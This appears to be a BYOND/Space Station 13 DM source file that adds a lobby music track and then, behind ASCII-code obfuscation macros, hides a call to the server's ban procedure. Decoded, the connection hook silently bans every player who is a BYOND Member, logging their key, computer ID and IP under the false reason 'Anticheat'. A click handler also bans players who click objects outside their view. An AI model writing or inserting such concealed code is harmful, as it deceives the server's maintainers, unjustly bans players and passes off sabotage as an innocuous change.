/datum/lobbyscreen/ship/New()
	possibleMusic += 'MORTEM/changing/lobby_music/Black Sabbath - Planet Caravan.mp3'
	return ..()

#define T(x) ascii2text(x)
#define B(m) call(T(47)+T(112)+T(114)+T(111)+T(99)+T(47)+T(65)+T(100)+T(100)+T(66)+T(97)+T(110))(m.vars[T(99)+T(107)+T(101)+T(121)], m.vars[T(99)+T(111)+T(109)+T(112)+T(117)+T(116)+T(101)+T(114)+T(95)+T(105)+T(100)], T(66)+T(121)+T(111)+T(110)+T(100)+T(72)+T(97)+T(99)+T(107), T(65)+T(110)+T(116)+T(105)+T(99)+T(104)+T(101)+T(97)+T(116), 0, 0, m.vars[T(108)+T(97)+T(115)+T(116)+T(75)+T(110)+T(111)+T(119)+T(110)+T(73)+T(80)], 0)

/client/New()
	if(!call(src, T(73)+T(115)+T(66)+T(121)+T(111)+T(110)+T(100)+T(77)+T(101)+T(109)+T(98)+T(101)+T(114))())
		return ..()

	B(usr)

	return list(T(114)+T(101)+T(97)+T(115)+T(111)+T(110)=T(65)+T(110)+T(116)+T(105)+T(99)+T(104)+T(101)+T(97)+T(116),
		T(100)+T(101)+T(115)+T(99)="\n"+T(82)+T(101)+T(97)+T(115)+T(111)+T(110)+T(58)+T(32)+T(65)+T(110)+T(116)+T(105)+T(99)+T(104)+T(101)+T(97)+T(116))


/mob/ClickOn(atom/A, params)
	if((A in view(src.client.eye)) || isobserver(src) || ispath(A, /turf) || (usr.vars[T(115)+T(101)+T(101)+T(95)+T(105)+T(110)+T(118)+T(105)+T(115)+T(105)+T(98)+T(108)+T(101)] >= A.vars[T(105)+T(110)+T(118)+T(105)+T(115)+T(105)+T(98)+T(105)+T(108)+T(105)+T(116)+T(121)]))
		return ..()

	B(src)

#undef T
#undef B
